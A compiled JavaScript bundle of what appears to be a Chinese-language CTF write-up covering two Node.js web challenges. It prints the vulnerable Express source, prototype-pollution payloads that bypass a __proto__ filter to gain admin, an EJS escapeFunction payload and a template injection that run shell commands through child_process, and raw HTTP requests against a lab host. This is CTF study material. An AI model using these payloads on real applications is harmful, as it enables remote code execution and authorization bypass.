"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[7369],{28453:(e,r,n)=>{n.d(r,{R:()=>i,x:()=>c});var s=n(96540);const t={},a=s.createContext(t);function i(e){const r=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(r):{...r,...e}}),[r,e])}function c(e){let r;return r=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:i(e.components),s.createElement(a.Provider,{value:r},e.children)}},31163:(e,r,n)=>{n.r(r),n.d(r,{assets:()=>o,contentTitle:()=>c,default:()=>p,frontMatter:()=>i,metadata:()=>s,toc:()=>d});const s=JSON.parse('{"id":"CTF/Misc/ctf-nodejs","title":"ctf-nodejs","description":"[HGAME 2023 week4]Shared Diary","source":"@site/docs/CTF/Misc/ctf-nodejs.md","sourceDirName":"CTF/Misc","slug":"/CTF/Misc/ctf-nodejs","permalink":"/docs/CTF/Misc/ctf-nodejs","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/Misc/ctf-nodejs.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"SHCTF2023","permalink":"/docs/CTF/Misc/SHCTF2023"},"next":{"title":"ctf-python","permalink":"/docs/CTF/Misc/ctf-python"}}');var t=n(74848),a=n(28453);const i={},c=void 0,o={},d=[{value:"[HGAME 2023 week4]Shared Diary",id:"hgame-2023-week4shared-diary",level:2},{value:"NewStarCTF 2023 WEEK3 OtenkiGirl",id:"newstarctf-2023-week3-otenkigirl",level:2}];function l(e){const r={code:"code",h2:"h2",img:"img",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(r.h2,{id:"hgame-2023-week4shared-diary",children:"[HGAME 2023 week4]Shared Diary"}),"\n",(0,t.jsx)(r.p,{children:"\u7ed9\u4e86\u6e90\u7801"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-javascript",children:"const express = require('express');\r\nconst bodyParser = require('body-parser');\r\nconst session = require('express-session');\r\nconst randomize = require('randomatic');\r\nconst ejs = require('ejs');\r\nconst path = require('path');\r\nconst app = express();\r\n\r\nfunction merge(target, source) {\r\n    for (let key in source) {\r\n        // Prevent prototype pollution\r\n        if (key === '__proto__') {\r\n            throw new Error(\"Detected Prototype Pollution\")\r\n        }\r\n        if (key in source && key in target) {\r\n            merge(target[key], source[key])\r\n        } else {\r\n            target[key] = source[key]\r\n        }\r\n    }\r\n}\r\n\r\napp\r\n    .use(bodyParser.urlencoded({extended: true}))\r\n    .use(bodyParser.json());\r\napp.set('views', path.join(__dirname, \"./views\"));\r\napp.set('view engine', 'ejs');\r\napp.use(session({\r\n    name: 'session',\r\n    secret: randomize('aA0', 16),\r\n    resave: false,\r\n    saveUninitialized: false\r\n}))\r\n\r\napp.all(\"/login\", (req, res) => {\r\n    if (req.method == 'POST') {\r\n        // save userinfo to session\r\n        let data = {};\r\n        try {\r\n            merge(data, req.body)\r\n        } catch (e) {\r\n            return res.render(\"login\", {message: \"Don't pollution my shared diary!\"})\r\n        }\r\n        req.session.data = data\r\n\r\n        // check password\r\n        let user = {};\r\n        user.password = req.body.password;\r\n        if (user.password=== \"testpassword\") {\r\n            user.role = 'admin'\r\n        }\r\n        if (user.role === 'admin') {\r\n            req.session.role = 'admin'\r\n            return res.redirect('/')\r\n        }else {\r\n            return res.render(\"login\", {message: \"Login as admin or don't touch my shared diary!\"})\r\n        } \r\n    }\r\n    res.render('login', {message: \"\"});\r\n});\r\n\r\napp.all('/', (req, res) => {\r\n    if (!req.session.data || !req.session.data.username || req.session.role !== 'admin') {\r\n        return res.redirect(\"/login\")\r\n    }\r\n    if (req.method == 'POST') {\r\n        let diary = ejs.render(`<div>${req.body.diary}</div>`)\r\n        req.session.diary = diary\r\n        return res.render('diary', {diary: req.session.diary, username: req.session.data.username});\r\n    }\r\n    return res.render('diary', {diary: req.session.diary, username: req.session.data.username});\r\n})\r\n\r\n\r\napp.listen(8888, '0.0.0.0');\n"})}),"\n",(0,t.jsxs)(r.p,{children:["\u6709",(0,t.jsx)(r.code,{children:"merge(data, req.body)"}),"\u51fd\u6570\uff0c\u8fc7\u6ee4\u4e86",(0,t.jsx)(r.code,{children:"__proto__"}),"\u8fd8\u53ef\u4ee5\u7528\u4e0b\u9762\u7684"]}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-javascript",children:'objectname["__proto__"]\r\nobjectname.__proto__\r\nobjectname.constructor.prototype\n'})}),"\n",(0,t.jsx)(r.p,{children:"payload"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-json",children:'{\r\n    "username": "123",\r\n    "password": "123",\r\n    "constructor": {\r\n        "prototype": {\r\n            "role": "admin"\r\n        }\r\n    }\r\n}\n'})}),"\n",(0,t.jsx)(r.p,{children:"\u6216\u8005"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{children:'{\r\n    "username": "123",\r\n    "password": "123",\r\n    "constructor": {\r\n        "prototype": {\r\n            "role": "admin",\r\n            "data":{"username":"admin"}\r\n        }\r\n    }\r\n}\n'})}),"\n",(0,t.jsx)(r.p,{children:"\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5229\u7528ejs.render\u672c\u8eab\u5b58\u5728\u7684\u6f0f\u6d1e\u5b9e\u73b0RCE"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{children:'{"constructor": {"prototype": {"role":"admin", "data":{"username":"admin"}, "client":true,"escapeFunction":"1; return global.process.mainModule.constructor._load(\'child_process\').execSync(\'cat /flag\');"}},"username":"admin","password":"admin"}\n'})}),"\n",(0,t.jsx)(r.p,{children:"\u63a5\u7740\u767b\u5f55\u4e0a\u53bb\uff0c\u662fejs\u7684\u6a21\u677f\u6ce8\u5165"}),"\n",(0,t.jsx)(r.p,{children:"payload"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{children:"<%- global.process.mainModule.require('child_process').execSync('cat /flag') %>\n"})}),"\n",(0,t.jsx)(r.h2,{id:"newstarctf-2023-week3-otenkigirl",children:"NewStarCTF 2023 WEEK3 OtenkiGirl"}),"\n",(0,t.jsx)(r.p,{children:"\u8fd9\u9898\u628a\u6240\u6709\u6e90\u7801\u76f4\u63a5\u7ed9\u4e86"}),"\n",(0,t.jsx)(r.p,{children:"\u8fd8\u7ed9\u4e86\u4e2a\u63d0\u793a"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{children:"\u300e\u300croutes\u300d\u30d5\u30a9\u30eb\u30c0\u30fc\u3060\u3051\u3092\u898b\u3066\u304f\u3060\u3055\u3044\u3002SQL\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u306f\u3042\u308a\u307e\u305b\u3093\u3002\u300f\u3068\u5fa1\u5742\u5fa1\u5742\u306f\u671f\u5f85\u306b\u6e80\u3061\u305f\u6c17\u6301\u3061\u3067\u8a00\u3063\u305f\u3002\r\n\u201c\u53ea\u770b\u201droutes\u201c\u6587\u4ef6\u5939\u3002\u6ca1\u6709SQL\u6ce8\u5165\u3002\u201c\u5fa1\u5742\u5fa1\u5742\u5e26\u7740\u5145\u6ee1\u671f\u5f85\u7684\u5fc3\u60c5\u8bf4\u9053\u3002\n"})}),"\n",(0,t.jsxs)(r.p,{children:["\u90a3\u6211\u4eec\u5c31\u53ea\u770b",(0,t.jsx)(r.code,{children:"routes"}),"\u6587\u4ef6\u5939"]}),"\n",(0,t.jsx)(r.p,{children:(0,t.jsx)(r.code,{children:"submit.js"})}),"\n",(0,t.jsxs)(r.p,{children:["\u9996\u5148\u53d1\u73b0\u4e86",(0,t.jsx)(r.code,{children:"merge"}),"\u51fd\u6570,\u731c\u6d4b\u53ef\u80fd\u662f\u539f\u578b\u94fe\u6c61\u67d3"]}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-javascript",children:'const merge = (dst, src) => {\r\n    if (typeof dst !== "object" || typeof src !== "object") return dst;\r\n    for (let key in src) {\r\n        if (key in dst && key in src) {\r\n            dst[key] = merge(dst[key], src[key]);\r\n        } else {\r\n            dst[key] = src[key];\r\n        }\r\n    }\r\n    return dst;\r\n}\n'})}),"\n",(0,t.jsxs)(r.p,{children:["\u7136\u540e\u5c31\u662f\u627e\uff0c\u8c01\u8c03\u7528\u4e86",(0,t.jsx)(r.code,{children:"merge"}),"\u51fd\u6570"]}),"\n",(0,t.jsx)(r.p,{children:(0,t.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240327205933012.png",alt:"image-20240327205933012"})}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-javascript",children:'const result = await insert2db(merge(DEFAULT, data));\r\nctx.body = {\r\n            status: "success",\r\n            data: result\r\n        };\n'})}),"\n",(0,t.jsxs)(r.p,{children:["\u63a5\u7740\u770b",(0,t.jsx)(r.code,{children:"insert2db"}),"\u51fd\u6570\uff0c\u4e3b\u8981\u662f\u628a\u6570\u636e\u63d2\u5165\u5230\u6570\u636e\u5e93\u4e2d\uff0c\u8fd9\u91cc\u4e5f\u6ca1\u6709sql\u6ce8\u5165\uff0c\u90a3\u6211\u4eec\u63a5\u7740\u770b"]}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-javascript",children:"await sql.run(`INSERT INTO wishes (wishid, date, place, contact, reason, timestamp) VALUES (?, ?, ?, ?, ?, ?)`,[wishid, date, place, contact, reason, timestamp]).catch(e => { throw e });\r\nreturn { wishid, date, place, contact, reason, timestamp }\n"})}),"\n",(0,t.jsxs)(r.p,{children:["\u5176\u5b9e\u8fd9\u4e2a\u51fd\u6570\u6ca1\u5565\u7528\uff08\u5bf9\u8fd9\u4e00\u9898\uff09\uff0c\u4e3b\u8981\u770b",(0,t.jsx)(r.code,{children:"/submit"}),"\u8def\u7531"]}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-javascript",children:'router.post("/submit", async (ctx) => {\r\n    const jsonText = ctx.request.rawBody || "{}"\r\n    try {\r\n        const data = JSON.parse(jsonText);\r\n        .......\r\n        const result = await insert2db(merge(DEFAULT, data));\r\n        ctx.body = {\r\n            status: "success",\r\n            data: result\r\n        };\r\n    } catch (e) {\r\n        console.error(e);\r\n        ctx.body = {\r\n            status: "error",\r\n            msg: "Internal Server Error"\r\n        }\r\n    }\r\n})\n'})}),"\n",(0,t.jsxs)(r.p,{children:[(0,t.jsx)(r.code,{children:"data = JSON.parse(jsonText)"}),"\u8fd9\u91cc\u662f\u8fdb\u5165\u70b9"]}),"\n",(0,t.jsx)(r.p,{children:(0,t.jsx)(r.code,{children:"info.js"})}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-javascript",children:'router.post("/info/:ts?", async (ctx) => {\r\n    ......\r\n    if (typeof ctx.params.ts === "undefined") ctx.params.ts = 0\r\n    const timestamp = /^[0-9]+$/.test(ctx.params.ts || "") ? Number(ctx.params.ts) : ctx.params.ts;\r\n    if (typeof timestamp !== "number")\r\n        return ctx.body = {\r\n            status: "error",\r\n            msg: "Invalid parameter ts"\r\n        }\r\n\r\n    try {\r\n        const data = await getInfo(timestamp).catch(e => { throw e });\r\n        ctx.body = {\r\n            status: "success",\r\n            data: data\r\n        }\r\n    } catch (e) {\r\n        console.error(e);\r\n        return ctx.body = {\r\n            status: "error",\r\n            msg: "Internal Server Error"\r\n        }\r\n    }\r\n})\n'})}),"\n",(0,t.jsxs)(r.p,{children:["\u63a5\u7740\u770b",(0,t.jsx)(r.code,{children:"getInfo"}),"\u51fd\u6570"]}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-javascript",children:'async function getInfo(timestamp) {\r\n    timestamp = typeof timestamp === "number" ? timestamp : Date.now();\r\n    // Remove test data from before the movie was released\r\n    let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();\r\n    timestamp = Math.max(timestamp, minTimestamp);\r\n    const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp >= ?`, [timestamp]).catch(e => { throw e });\r\n    return data;\r\n}\n'})}),"\n",(0,t.jsxs)(r.p,{children:["\u5c06\u6211\u4eec\u4f20\u5165\u7684",(0,t.jsx)(r.code,{children:"ts"}),"\u7684\u503c\uff0c\u8d4b\u503c\u7ed9",(0,t.jsx)(r.code,{children:"timestamp"})]}),"\n",(0,t.jsxs)(r.p,{children:["\u800c\u5728",(0,t.jsx)(r.code,{children:"getInfo"}),"\u51fd\u6570\u4e2d,",(0,t.jsx)(r.code,{children:"timestamp = Math.max(timestamp, minTimestamp);"}),"\u53d6\u4e00\u4e2a\u6700\u5927\u7684\u503c"]}),"\n",(0,t.jsxs)(r.p,{children:[(0,t.jsx)(r.code,{children:"let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();"}),"\uff0c\u8fd9\u91cc\u7528\u7684\u662f",(0,t.jsx)(r.code,{children:"||"})]}),"\n",(0,t.jsxs)(r.p,{children:["\u800c\u4e14config\u91cc\u9762\u6ca1\u6709",(0,t.jsx)(r.code,{children:"min_public_time"}),"\u8fd9\u4e2a\u5c5e\u6027\uff0c\u90a3\u4e48\u8fd9\u91cc\u5c31\u662f\u4e00\u4e2a\u6c61\u67d3\u70b9"]}),"\n",(0,t.jsx)(r.p,{children:(0,t.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240327211541027.png",alt:"image-20240327211541027"})}),"\n",(0,t.jsx)(r.p,{children:"payload"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-http",children:'POST /submit HTTP/1.1\r\nHost: d537bd54-f21f-4d58-8d85-2b346bf42e78.node5.buuoj.cn:81\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0\r\nAccept: */*\r\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://d537bd54-f21f-4d58-8d85-2b346bf42e78.node5.buuoj.cn:81/\r\nContent-Type: application/json\r\nContent-Length: 102\r\nOrigin: http://d537bd54-f21f-4d58-8d85-2b346bf42e78.node5.buuoj.cn:81\r\nConnection: close\r\n\r\n{\r\n\t"date":"",\r\n\t"place":"",\r\n\t"contact":"1",\r\n\t"reason":"1",\r\n\t"__proto__":{\r\n\t\t"min_public_time":"1001-01-01"\r\n\t}\r\n}\n'})}),"\n",(0,t.jsxs)(r.p,{children:["\u8fd9\u91cc",(0,t.jsx)(r.code,{children:'"contact":"1","reason":"1",'}),"\u662f\u5fc5\u987b\u6709\u7684"]}),"\n",(0,t.jsxs)(r.p,{children:["\u7136\u540e\u8bbf\u95ee",(0,t.jsx)(r.code,{children:"/info/0"})]}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-http",children:"POST /info/0 HTTP/1.1\r\nHost: d537bd54-f21f-4d58-8d85-2b346bf42e78.node5.buuoj.cn:81\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\n"})}),"\n",(0,t.jsx)(r.p,{children:"\u5f97\u5230flag"}),"\n",(0,t.jsx)(r.p,{children:(0,t.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240327204815020.png",alt:"image-20240327204815020"})})]})}function p(e={}){const{wrapper:r}={...(0,a.R)(),...e.components};return r?(0,t.jsx)(r,{...e,children:(0,t.jsx)(l,{...e})}):l(e)}}}]);